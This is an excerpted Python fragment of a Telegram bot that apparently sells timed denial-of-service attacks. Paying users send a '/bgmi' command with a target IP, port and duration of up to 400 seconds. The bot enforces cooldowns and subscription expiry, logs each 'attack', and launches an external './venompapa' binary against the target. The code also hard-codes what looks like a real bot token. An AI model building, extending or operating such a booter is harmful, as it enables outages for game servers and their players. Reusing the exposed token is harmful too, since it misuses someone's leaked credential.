...
bot = telebot.TeleBot('7248587968:AAEGfzxxaxqhe7xWxvoO18gavwOwFjxPMIo')
        ...
        if datetime.datetime.now() <= expiration_date:
            if user_id not in admin_id:
                if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                    response = f"You are on cooldown. Please wait {COOLDOWN_TIME // 60} 1minutes before running the /bgmi command again."
                    bot.reply_to(message, response)
                    return
            ...
            if len(command) == 4:
                ...
                try:
                    ...
                    time = int(command[3])
                    if time > 400:
                        response = "⚠️Error: Time interval must be less than 400 seconds."
                    else:
                        record_command_logs(user_id, '/bgmi', target, port, time)
                        log_command(user_id, target, port, time)
                        start_attack_reply(message, target, port, time)
                        full_command = f"./venompapa {target} {port} {time}"
